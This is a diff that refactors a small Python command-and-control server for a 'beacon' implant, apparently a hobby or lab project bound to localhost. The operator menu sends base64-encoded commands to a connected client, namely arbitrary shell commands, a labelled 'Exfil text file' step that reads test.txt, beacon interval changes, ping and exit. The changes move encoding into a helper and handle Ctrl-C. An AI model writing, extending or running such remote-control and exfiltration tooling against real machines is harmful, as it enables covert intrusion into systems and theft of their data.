@@ -14,19 +14,18 @@ class MyTCPHandler(socketserver.BaseRequestHandler):
 
         # Run a command
         if option == "1":
-            command = input("Enter command: ")
+            self.command = input("Enter command: ")
+            self.encodedcommand = self.encode()
 
-            encodedcommand = base64.b64encode(command.encode("utf-8")).decode("utf-8")
-
-            self.request.sendall(bytes(encodedcommand, "utf-8"))
+            self.request.sendall(bytes(self.encodedcommand, "utf-8"))
             self.data = self.request.recv(2048).strip().decode('utf-8')
             print(self.data)
             
         # Exfil text file
         elif option == "2":
-            command = "type test.txt"
-            encodedcommand = base64.b64encode(command.encode("utf-8")).decode("utf-8")
-            self.request.sendall(bytes(encodedcommand, "utf-8"))
+            self.command = "type test.txt"
+            self.encodedcommand = self.encode() 
+            self.request.sendall(bytes(self.encodedcommand, "utf-8"))
             
             self.data = self.request.recv(2048).strip().decode('utf-8')
 
@@ -43,28 +42,32 @@ class MyTCPHandler(socketserver.BaseRequestHandler):
             
             if max >= min:
                 # Tell the client we are changing the interval
-                interval = "INTERVAL"
-                interval = base64.b64encode(interval.encode("utf-8")).decode("utf-8")
-                self.request.sendall(bytes(interval, "utf-8"))
-                time.sleep(1)
+                self.command = "INTERVAL"
+                self.encodedcommand = self.encode()
+                self.request.sendall(bytes(self.encodedcommand, "utf-8"))
+                time.sleep(.5)
                 self.request.sendall(bytes(min, "utf-8"))
                 self.request.sendall(bytes(max, "utf-8"))
             else:
                 print("Please enter a valid min and max")
         
         elif option == "4":
-            command = "PING"
-            interval = base64.b64encode(command.encode("utf-8")).decode("utf-8")
-            self.request.sendall(bytes(interval, "utf-8"))
+            self.command = "PING"
+            self.encodedcommand = self.encode()
+            self.request.sendall(bytes(self.encodedcommand, "utf-8"))
             print("Pinging 8.8.8.8")
             
         else:
-            command = "exit"
-            encodedcommand = base64.b64encode(command.encode("utf-8")).decode("utf-8")
-            self.request.sendall(bytes(encodedcommand, "utf-8"))
+            self.command = "exit"
+            self.encodedcommand = self.encode()
+            self.request.sendall(bytes(self.encodedcommand, "utf-8"))
 
     def menu():
         print("Type exit to stop beacon")
+
+    def encode(self):
+        self.encodedcommand = base64.b64encode(self.command.encode("utf-8")).decode("utf-8")
+        return self.encodedcommand
 
 if __name__ == "__main__":
     HOST, PORT = "localhost", 9999
@@ -73,4 +76,7 @@ if __name__ == "__main__":
     with socketserver.TCPServer((HOST, PORT), MyTCPHandler) as server:
         # Activate the server; this will keep running until you
         # interrupt the program with Ctrl-C
-        server.serve_forever()
+        try:
+            server.serve_forever()
+        except KeyboardInterrupt:
+            pass
